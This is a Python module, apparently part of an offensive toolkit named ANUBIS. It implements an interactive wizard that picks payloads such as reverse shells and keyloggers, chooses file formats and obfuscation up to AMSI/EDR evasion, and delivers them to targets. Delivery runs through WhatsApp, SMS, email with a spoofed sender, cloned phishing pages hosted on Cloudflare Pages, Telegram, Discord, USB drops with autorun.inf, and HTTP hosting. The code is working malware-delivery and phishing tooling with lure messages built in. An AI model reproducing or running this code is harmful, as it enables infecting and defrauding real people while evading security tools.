"""
DeliveryOrchestrator — Interactive multi-channel delivery coordinator.

Walks the user through:
  1. What to deliver (payload selection or artifact)
  2. Channel selection (WhatsApp, SMS, Email, Phishing, USB, SMB, HTTP, DNS)
  3. File type / format (EXE, DLL, PS1, HTA, ISO, LNK, DOCM, PDF, XLL)
  4. Obfuscation level (None, Light, Heavy, AGGRESSIVE)
  5. Cloudflare handling (detect, bypass, or deploy via CF Workers/Pages)
  6. Artifact identification (is this malware? will it be caught?)
  7. Delivery execution
"""

import os
import sys
import json
import time
import uuid
import tempfile
import textwrap
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional, Dict, List, Any, Callable


@dataclass
class DeliveryPlan:
    """Complete delivery plan assembled by the orchestrator."""
    plan_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    payload_source: Optional[str] = None
    payload_name: Optional[str] = None
    channel: Optional[str] = None          # whatsapp, sms, email, phishing, usb, smb, http, dns
    file_format: Optional[str] = None      # exe, dll, ps1, hta, iso, lnk, docm, pdf, xll
    obfuscation: Optional[str] = None      # none, light, heavy, aggressive
    use_cloudflare: bool = False
    cloudflare_action: Optional[str] = None  # detect_bypass, worker_deploy, pages_deploy
    target_info: Dict[str, Any] = field(default_factory=dict)
    phishing_template: Optional[str] = None
    phishing_domain: Optional[str] = None
    artifact_classification: Optional[Dict[str, Any]] = None
    created_at: float = field(default_factory=time.time)
    status: str = "draft"                  # draft, executing, delivered, failed


class DeliveryOrchestrator:
    """Interactive delivery orchestrator. Walks user through delivery decisions."""

    CHANNELS = {
        "1":  {"name": "WhatsApp",        "key": "whatsapp"},
        "2":  {"name": "SMS",             "key": "sms"},
        "3":  {"name": "Email (SMTP)",    "key": "email"},
        "4":  {"name": "Phishing Page",   "key": "phishing"},
        "5":  {"name": "Telegram",        "key": "telegram"},
        "6":  {"name": "Discord Webhook", "key": "discord"},
        "7":  {"name": "USB Drop",        "key": "usb"},
        "8":  {"name": "SMB Share",       "key": "smb"},
        "9":  {"name": "HTTP(S) Host",    "key": "http"},
        "10": {"name": "DNS Tunnel",      "key": "dns"},
    }

    FILE_FORMATS = {
        "1":  {"name": "Windows PE (.exe)",    "key": "exe",   "os": ["windows"]},
        "2":  {"name": "DLL (.dll)",            "key": "dll",   "os": ["windows"]},
        "3":  {"name": "PowerShell (.ps1)",     "key": "ps1",   "os": ["windows"]},
        "4":  {"name": "HTA (.hta)",            "key": "hta",   "os": ["windows"]},
        "5":  {"name": "ISO (.iso)",            "key": "iso",   "os": ["windows"]},
        "6":  {"name": "LNK Shortcut (.lnk)",   "key": "lnk",   "os": ["windows"]},
        "7":  {"name": "Office Macro (.docm)",  "key": "docm",  "os": ["windows", "macos"]},
        "8":  {"name": "PDF with JS (.pdf)",    "key": "pdf",   "os": ["windows", "macos"]},
        "9":  {"name": "Excel Add-in (.xll)",   "key": "xll",   "os": ["windows"]},
        "10": {"name": "Shell Script (.sh)",    "key": "sh",    "os": ["linux", "macos"]},
        "11": {"name": "Mach-O Binary",         "key": "macho", "os": ["macos"]},
        "12": {"name": "Python Payload (.py)",  "key": "py",    "os": ["windows", "linux", "macos"]},
    }

    OBFUSCATION_LEVELS = {
        "1": {"name": "None — Raw payload",                        "key": "none"},
        "2": {"name": "Light — Base64 + variable renaming",        "key": "light"},
        "3": {"name": "Heavy — Encryption + split + reorder",      "key": "heavy"},
        "4": {"name": "Aggressive — Polymorphic + AMSI/EDR evade","key": "aggressive"},
    }

    def __init__(
        self,
        telemetry=None,
        delivery_pipeline=None,
        compat=None,
        interactive: bool = True,
    ):
        self._telemetry = telemetry
        self._pipeline = delivery_pipeline
        self._compat = compat
        self._interactive = interactive
        self._phishing_engine = None
        self._messaging = None
        self._cloudflare = None
        self._artifact_id = None
        self._plan = DeliveryPlan()

    # ── Lazy subsystem init ──────────────────────────────────────────

    @property
    def phishing(self):
        if self._phishing_engine is None:
            from .phishing_engine import PhishingEngine
            self._phishing_engine = PhishingEngine(
                telemetry=self._telemetry
            )
        return self._phishing_engine

    @property
    def messaging(self):
        if self._messaging is None:
            from .messaging import MessagingChannels
            self._messaging = MessagingChannels(
                telemetry=self._telemetry
            )
        return self._messaging

    @property
    def cloudflare(self):
        if self._cloudflare is None:
            from .cloudflare import CloudflareUtils
            self._cloudflare = CloudflareUtils(
                telemetry=self._telemetry
            )
        return self._cloudflare

    @property
    def artifact_identifier(self):
        if self._artifact_id is None:
            from .artifact_id import ArtifactIdentifier
            self._artifact_id = ArtifactIdentifier(
                telemetry=self._telemetry
            )
        return self._artifact_id

    # ── Interactive Wizard ───────────────────────────────────────────

    def run_interactive(self) -> DeliveryPlan:
        """Full interactive delivery wizard. Asks user step-by-step."""
        if not self._interactive:
            raise RuntimeError("Orchestrator not in interactive mode")

        self._log_info("=== ANUBIS SMART DELIVERY ORCHESTRATOR ===")
        self._log_info(f"Plan ID: {self._plan.plan_id}")
        print()

        # Step 1: What to deliver
        self._step_select_payload()

        # Step 2: Artifact identification
        if self._plan.payload_source:
            self._step_identify_artifact()

        # Step 3: Choose delivery channel
        self._step_select_channel()

        # Step 4: Choose file format
        self._step_select_format()

        # Step 5: Obfuscation level
        self._step_select_obfuscation()

        # Step 6: Target info (context-dependent)
        self._step_target_info()

        # Step 7: Cloudflare handling (if applicable)
        if self._should_ask_cloudflare():
            self._step_cloudflare()

        # Step 8: Phishing-specific (if channel is phishing)
        if self._plan.channel == "phishing":
            self._step_phishing_template()

        # Step 9: Confirm and execute
        self._step_confirm()

        return self._plan

    def _step_select_payload(self):
        """Step 1: Ask what to deliver."""
        self._log_info("[STEP 1/9] What do you want to deliver?")
        print("  1) A module from the registry (e.g. revshell, keylogger)")
        print("  2) A custom file on disk (exe, script, document)")
        print("  3) Generate a new payload interactively")
        choice = self._prompt("Choice (1-3)", default="1")

        if choice == "2":
            path = self._prompt("Enter full path to file")
            if path and os.path.isfile(path):
                self._plan.payload_source = path
                self._plan.payload_name = os.path.basename(path)
                self._log_info(f"  → Selected: {self._plan.payload_name}")
            else:
                self._log_error("File not found. Aborting.")
                sys.exit(1)
        elif choice == "3":
            self._log_info("  Interactive payload generation coming soon.")
            self._log_info("  For now, select option 1 or 2.")
            self._step_select_payload()  # retry
        else:
            # Use module from registry
            modules = self._list_available_modules()
            if not modules:
                self._log_warning("No modules loaded. Falling back to file.")
                self._step_select_payload()
                return
            print("\nAvailable modules:")
            for i, mod in enumerate(modules, 1):
                print(f"  {i}) {mod.get('name', 'Unknown')} v{mod.get('version','?')}")
            mod_choice = self._prompt("Select module number", default="1")
            try:
                idx = int(mod_choice) - 1
                if 0 <= idx < len(modules):
                    self._plan.payload_source = f"module://{modules[idx]['id']}"
                    self._plan.payload_name = modules[idx]['name']
                    self._log_info(f"  → Selected module: {self._plan.payload_name}")
            except (ValueError, IndexError):
                self._log_error("Invalid selection.")
                self._step_select_payload()

    def _step_identify_artifact(self):
        """Step 2: Identify if the payload is malware, pentest tool, etc."""
        self._log_info("[STEP 2/9] Analyzing artifact classification...")
        source = self._plan.payload_source
        if not source or source.startswith("module://"):
            self._log_info("  (Module payload — skipping file analysis)")
            self._plan.artifact_classification = {
                "class": "pentest_tool",
                "risk": "medium",
                "note": "Registered Anubis module",
            }
            return

        try:
            result = self.artifact_identifier.analyze(source)
            self._plan.artifact_classification = result
            self._log_info(f"  Classification: {result.get('class','unknown')}")
            self._log_info(f"  Risk Level:     {result.get('risk','unknown')}")
            self._log_info(f"  Detection Rate: {result.get('detection_rate','?')}")

            if result.get("class") == "malware" and result.get("risk") == "critical":
                warn = ("  ⚠ WARNING: This artifact appears to be known malware. "
                        "Delivery may be flagged by AV/EDR.")
                self._log_warning(warn)
                proceed = self._prompt("Continue anyway? (y/N)", default="n")
                if proceed.lower() != "y":
                    self._log_info("Delivery aborted by user.")
                    sys.exit(0)
        except Exception as e:
            self._log_warning(f"  Could not analyze artifact: {e}")
            self._plan.artifact_classification = {"class": "unknown", "risk": "unknown"}

    def _step_select_channel(self):
        """Step 3: Choose delivery channel."""
        self._log_info("[STEP 3/9] Select delivery channel:")
        for num, info in self.CHANNELS.items():
            print(f"  {num}) {info['name']}")
        choice = self._prompt("Channel number", default="4")
        if choice in self.CHANNELS:
            self._plan.channel = self.CHANNELS[choice]["key"]
            self._log_info(f"  → Channel: {self.CHANNELS[choice]['name']}")
        else:
            self._log_error("Invalid channel.")
            self._step_select_channel()

    def _step_select_format(self):
        """Step 4: Choose output file format."""
        self._log_info(f"[STEP 4/9] Select file format:")
        os_filter = self._get_current_os()
        for num, info in self.FILE_FORMATS.items():
            compatible = os_filter in info["os"] or "all" in info["os"] or not info["os"]
            marker = " ✅" if compatible else " ⚠️"
            print(f"  {num}) {info['name']}{marker}")
        choice = self._prompt("Format number", default="1")
        if choice in self.FILE_FORMATS:
            self._plan.file_format = self.FILE_FORMATS[choice]["key"]
            self._log_info(f"  → Format: {self.FILE_FORMATS[choice]['name']}")
        else:
            self._log_error("Invalid format.")
            self._step_select_format()

    def _step_select_obfuscation(self):
        """Step 5: Obfuscation level."""
        self._log_info("[STEP 5/9] Select obfuscation level:")
        for num, info in self.OBFUSCATION_LEVELS.items():
            print(f"  {num}) {info['name']}")
        choice = self._prompt("Obfuscation level", default="2")
        if choice in self.OBFUSCATION_LEVELS:
            self._plan.obfuscation = self.OBFUSCATION_LEVELS[choice]["key"]
            self._log_info(f"  → Obfuscation: {self.OBFUSCATION_LEVELS[choice]['name']}")
        else:
            self._log_error("Invalid choice.")
            self._step_select_obfuscation()

    def _step_target_info(self):
        """Step 6: Collect target information based on channel."""
        self._log_info(f"[STEP 6/9] Target information for {self._plan.channel}:")

        channel = self._plan.channel
        info = {}

        if channel in ("whatsapp", "sms"):
            info["phone"] = self._prompt("Target phone number (with country code)")
            info["message_template"] = self._prompt(
                "Message to accompany payload",
                default="Hey, check out this file I promised you"
            )
        elif channel == "email":
            info["to"] = self._prompt("Target email address")
            info["subject"] = self._prompt("Email subject",
                                           default="Invoice / Report / Document")
            info["body"] = self._prompt("Email body (HTML or plain)",
                                        default="Please find the attached document.")
            info["spoof_from"] = self._prompt("Spoof sender address (optional)",
                                              default="")
        elif channel == "phishing":
            info["target_url"] = self._prompt("URL to clone/spoof (e.g. login page)")
            info["campaign_name"] = self._prompt("Campaign name",
                                                 default="Q3 Security Update")
            info["target_emails"] = self._prompt(
                "Target emails (comma-separated)", default="")
        elif channel == "telegram":
            info["chat_id"] = self._prompt("Target chat/group ID or username")
            info["bot_token"] = self._prompt("Bot token (or press Enter for config)",
                                             default="")
        elif channel == "discord":
            info["webhook_url"] = self._prompt("Discord webhook URL")
            info["message"] = self._prompt("Message text", default="Important update")
        elif channel == "usb":
            info["drive_letter"] = self._prompt(
                "Target drive letter (or AUTO for first removable)",
                default="AUTO")
            info["autorun"] = self._prompt("Create autorun.inf? (y/N)",
                                           default="n")
        elif channel == "http":
            info["host"] = self._prompt("Host to serve on",
                                        default="0.0.0.0")
            info["port"] = self._prompt("Port", default="8080")
            info["path"] = self._prompt("URL path", default="/download")

        self._plan.target_info = info

    def _should_ask_cloudflare(self) -> bool:
        """Determine if Cloudflare handling should be offered."""
        channel = self._plan.channel
        return channel in ("phishing", "http", "email")

    def _step_cloudflare(self):
        """Step 7: Cloudflare integration."""
        self._log_info("[STEP 7/9] Cloudflare integration:")

        # Detect if target uses Cloudflare
        target_url = self._plan.target_info.get("target_url") or \
                     self._plan.target_info.get("to", "").split("@")[-1]

        if target_url:
            self._log_info(f"  Checking {target_url} for Cloudflare...")
            try:
                cf_info = self.cloudflare.detect(target_url)
                if cf_info.get("cloudflare"):
                    self._log_info(f"  ✅ Cloudflare detected: {cf_info.get('details','')}")
                    print("  1) Bypass — resolve real IP")
                    print("  2) Deploy via Cloudflare Workers (host payload)")
                    print("  3) Deploy via Cloudflare Pages (phishing page)")
                    print("  4) Skip — deliver directly")
                    cf_choice = self._prompt("Choice", default="4")
                    actions = {"1": "detect_bypass", "2": "worker_deploy",
                               "3": "pages_deploy", "4": "skip"}
                    self._plan.cloudflare_action = actions.get(cf_choice, "skip")
                    self._plan.use_cloudflare = self._plan.cloudflare_action != "skip"
                else:
                    self._log_info("  No Cloudflare detected.")
                    self._plan.use_cloudflare = False
            except Exception as e:
                self._log_warning(f"  Cloudflare check failed: {e}")
                use = self._prompt("Attempt CF Workers deployment anyway? (y/N)",
                                   default="n")
                self._plan.use_cloudflare = use.lower() == "y"
        else:
            self._plan.use_cloudflare = False

    def _step_phishing_template(self):
        """Step 8: Select phishing template (only for phishing channel)."""
        self._log_info("[STEP 8/9] Select phishing template:")
        templates = self.phishing.list_templates()

        # Show categories
        categories = set(t["category"] for t in templates)
        print("\n  Categories available:")
        for cat in sorted(categories):
            count = sum(1 for t in templates if t["category"] == cat)
            print(f"    • {cat} ({count} templates)")

        # Show first 20, then ask to filter
        print(f"\n  Total templates: {len(templates)}")
        print("  Enter search term to filter, or number to select:")

        search = self._prompt("Search / Number", default="")
        if search.isdigit():
            idx = int(search) - 1
            if 0 <= idx < len(templates):
                self._plan.phishing_template = templates[idx]["id"]
                self._log_info(f"  → Template: {templates[idx]['name']}")
                # Ask for custom domain
                domain = self._prompt("Custom domain for phishing page (or Enter for default)",
                                      default="")
                self._plan.phishing_domain = domain or None
                return

        # Filter by search
        search_lower = search.lower()
        filtered = [t for t in templates
                    if search_lower in t["name"].lower()
                    or search_lower in t["category"].lower()
                    or search_lower in t["description"].lower()]

        if filtered:
            print(f"\n  Matching templates ({len(filtered)}):")
            for i, t in enumerate(filtered[:20], 1):
                print(f"    {i}) {t['name']} [{t['category']}]")
            choice = self._prompt("Select template number", default="1")
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(filtered):
                    self._plan.phishing_template = filtered[idx]["id"]
                    self._log_info(f"  → Template: {filtered[idx]['name']}")
            except (ValueError, IndexError):
                self._log_error("Invalid.")
                self._step_phishing_template()
        else:
            self._log_warning("No matching templates. Try again.")
            self._step_phishing_template()

    def _step_confirm(self):
        """Step 9: Show summary and confirm delivery."""
        print()
        self._log_info("=" * 60)
        self._log_info("DELIVERY PLAN SUMMARY")
        self._log_info("=" * 60)
        print(f"  Plan ID:         {self._plan.plan_id}")
        print(f"  Payload:         {self._plan.payload_name or 'N/A'}")
        print(f"  Channel:         {self._plan.channel}")
        print(f"  Format:          {self._plan.file_format}")
        print(f"  Obfuscation:     {self._plan.obfuscation}")
        print(f"  Cloudflare:      {'Yes' if self._plan.use_cloudflare else 'No'}")
        if self._plan.phishing_template:
            print(f"  Phishing tmpl:   {self._plan.phishing_template}")
        if self._plan.artifact_classification:
            c = self._plan.artifact_classification
            print(f"  Artifact class:  {c.get('class', '?')} ({c.get('risk', '?')})")
        print(f"  Target info:     {json.dumps(self._plan.target_info, indent=4)}")
        print()

        confirm = self._prompt("Execute delivery plan? (Y/n)", default="y")
        if confirm.lower() == "y":
            self._execute_plan()
        else:
            self._log_info("Delivery cancelled.")
            self._plan.status = "cancelled"

    # ── Plan Execution ────────────────────────────────────────────────

    def _execute_plan(self):
        """Execute the assembled delivery plan."""
        self._plan.status = "executing"
        self._log_info(f"[EXECUTING] Delivery plan {self._plan.plan_id}")

        channel = self._plan.channel
        try:
            if channel == "phishing":
                self._execute_phishing()
            elif channel in ("whatsapp", "sms", "email", "telegram", "discord"):
                self._execute_messaging()
            elif channel == "usb":
                self._execute_usb()
            elif channel == "http":
                self._execute_http()
            elif channel == "smb":
                self._execute_smb()
            elif channel == "dns":
                self._execute_dns()
            else:
                self._log_error(f"Unknown channel: {channel}")
                self._plan.status = "failed"
                return

            self._plan.status = "delivered"
            self._log_info(f"✅ Delivery complete! Plan ID: {self._plan.plan_id}")
        except Exception as e:
            self._plan.status = "failed"
            self._log_error(f"❌ Delivery failed: {e}")
            if self._telemetry:
                self._telemetry.error(f"Delivery failed: {e}")

    def _execute_phishing(self):
        """Deploy phishing page and distribute."""
        tmpl_id = self._plan.phishing_template
        if not tmpl_id:
            self._log_error("No phishing template selected.")
            return

        # Render the template
        html = self.phishing.render_template(
            tmpl_id,
            target_info=self._plan.target_info,
        )

        # Deploy
        if self._plan.use_cloudflare and self._plan.cloudflare_action == "pages_deploy":
            self._log_info("  Deploying via Cloudflare Pages...")
            result = self.cloudflare.deploy_pages(
                html=html,
                domain=self._plan.phishing_domain,
            )
            self._log_info(f"  Pages URL: {result.get('url', 'N/A')}")
        else:
            # Local HTTP server
            host = self._plan.target_info.get("host", "0.0.0.0")
            port = int(self._plan.target_info.get("port", "8080"))
            self._log_info(f"  Starting phishing server on {host}:{port}...")
            self.phishing.serve_template(
                template_id=tmpl_id,
                host=host,
                port=port,
                html_content=html,
            )

        # If target emails specified, send phishing links
        emails = self._plan.target_info.get("target_emails", "")
        if emails and self._plan.use_cloudflare:
            for email in [e.strip() for e in emails.split(",") if e.strip()]:
                self._log_info(f"  → Sending phishing link to {email}")

    def _execute_messaging(self):
        """Send payload via messaging channel."""
        channel = self._plan.channel
        phone = self._plan.target_info.get("phone", "")
        to_addr = self._plan.target_info.get("to", "")
        message = self._plan.target_info.get("message_template", "")
        subject = self._plan.target_info.get("subject", "")
        body = self._plan.target_info.get("body", "")

        # Build payload
        payload_data = self._build_payload_data()

        if channel == "whatsapp":
            self.messaging.send_whatsapp(
                to=phone,
                message=message,
                file_path=payload_data,
            )
        elif channel == "sms":
            self.messaging.send_sms(
                to=phone,
                message=message + (f" Download: {payload_data}" if payload_data else ""),
            )
        elif channel == "email":
            self.messaging.send_email(
                to=to_addr,
                subject=subject or "Important Document",
                body=body or "Please find attached.",
                attachment=payload_data,
                spoof_from=self._plan.target_info.get("spoof_from"),
            )
        elif channel == "telegram":
            chat_id = self._plan.target_info.get("chat_id", "")
            bot_token = self._plan.target_info.get("bot_token", "")
            self.messaging.send_telegram(
                chat_id=chat_id,
                text=message,
                file_path=payload_data,
                bot_token=bot_token or None,
            )
        elif channel == "discord":
            webhook = self._plan.target_info.get("webhook_url", "")
            self.messaging.send_discord_webhook(
                webhook_url=webhook,
                message=message,
                file_path=payload_data,
            )

    def _execute_usb(self):
        """Drop payload onto USB drive."""
        drive = self._plan.target_info.get("drive_letter", "AUTO")
        autorun = self._plan.target_info.get("autorun", "n").lower() == "y"

        # Resolve drive
        if drive == "AUTO":
            import psutil
            for part in psutil.disk_partitions():
                if "removable" in part.opts.lower():
                    drive = part.mountpoint
                    break
            if drive == "AUTO":
                self._log_error("No removable drive found.")
                return

        payload_data = self._build_payload_data()
        if payload_data and os.path.isfile(payload_data):
            dest = os.path.join(drive, self._plan.payload_name or "payload.exe")
            import shutil
            shutil.copy2(payload_data, dest)
            self._log_info(f"  Payload dropped: {dest}")

            if autorun:
                autorun_content = f"[AutoRun]\nopen={os.path.basename(dest)}\n"
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write(autorun_content)
                self._log_info("  autorun.inf created")

    def _execute_http(self):
        """Host payload via HTTP server."""
        host = self._plan.target_info.get("host", "0.0.0.0")
        port = int(self._plan.target_info.get("port", "8080"))
        path = self._plan.target_info.get("path", "/download")

        # Use delivery pipeline or simple HTTP server
        if self._pipeline:
            self._log_info(f"  Using delivery pipeline (HTTP sender)...")
        else:
            payload_data = self._build_payload_data()
            if payload_data and os.path.isfile(payload_data):
                self._log_info(f"  Starting HTTP server on {host}:{port}{path}")
                self._log_info(f"  Payload: {payload_data}")
                # Launch simple HTTP server in thread
                import threading
                server_thread = threading.Thread(
                    target=self._simple_http_server,
                    args=(host, port, payload_data, path),
                    daemon=True,
                )
                server_thread.start()
                self._log_info(f"  URL: http://{host}:{port}{path}")

    def _execute_smb(self):
        """Stage payload on SMB share."""
        self._log_info("  SMB delivery requires target network context.")
        self._log_info("  Use the delivery pipeline with SMB sender configured.")

    def _execute_dns(self):
        """Deliver via DNS tunneling."""
        self._log_info("  DNS delivery requires a DNS tunneling server.")
        if self._pipeline:
            self._log_info("  Using delivery pipeline DNS tunnel sender...")

    def _build_payload_data(self) -> Optional[str]:
        """Build/obtain the payload file based on the plan."""
        source = self._plan.payload_source
        if not source:
            return None

        if source.startswith("module://"):
            # Use the delivery pipeline to build the module
            module_id = source.replace("module://", "")
            if self._pipeline:
                fmt = self._plan.file_format or "exe"
                result = self._pipeline.build(
                    module_id=module_id,
                    fmt=fmt,
                    obfuscation=self._plan.obfuscation or "light",
                )
                return result.path if result else None
            return None

        # The source is a file path
        if os.path.isfile(source):
            return source
        return None

    def _simple_http_server(self, host, port, file_path, url_path):
        """Serve a single file via HTTP."""
        from http.server import HTTPServer, BaseHTTPRequestHandler

        class SingleFileHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == url_path:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.send_header("Content-Disposition",
                                     f'attachment; filename="{os.path.basename(file_path)}"')
                    self.send_header("Content-Length", str(os.path.getsize(file_path)))
                    self.end_headers()
                    with open(file_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b"Not Found")

            def log_message(self, fmt, *args):
                self.server._log(f"[HTTP] {args[0]} {args[1]} {args[2]}")

        server = HTTPServer((host, port), SingleFileHandler)
        server._log = self._log_info
        self._log_info(f"  HTTP server running on http://{host}:{port}{url_path}")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()

    # ── Helpers ───────────────────────────────────────────────────────

    def execute_plan(self, plan: DeliveryPlan) -> DeliveryPlan:
        """Execute a pre-built plan (non-interactive mode)."""
        self._plan = plan
        self._execute_plan()
        return self._plan

    def _list_available_modules(self):
        """Get list of loaded modules from the loader."""
        if hasattr(self, '_loader') and self._loader:
            return self._loader.list_loaded()
        return []

    def _get_current_os(self):
        import platform
        system = platform.system().lower()
        if system == "windows":
            return "windows"
        elif system == "linux":
            return "linux"
        elif system == "darwin":
            return "macos"
        return "unknown"

    def _prompt(self, text: str, default: str = "") -> str:
        """Prompt user for input."""
        if default:
            result = input(f"  {text} [{default}]: ").strip()
            return result if result else default
        return input(f"  {text}: ").strip()

    def _log_info(self, msg): self._log("INFO", msg)
    def _log_warning(self, msg): self._log("WARNING", msg)
    def _log_error(self, msg): self._log("ERROR", msg)

    def _log(self, level, msg):
        prefix = {"INFO": "[+]", "WARNING": "[!]", "ERROR": "[-]"}
        print(f"  {prefix.get(level, '[*]')} {msg}")
        if self._telemetry:
            getattr(self._telemetry, level.lower(), self._telemetry.info)(msg)
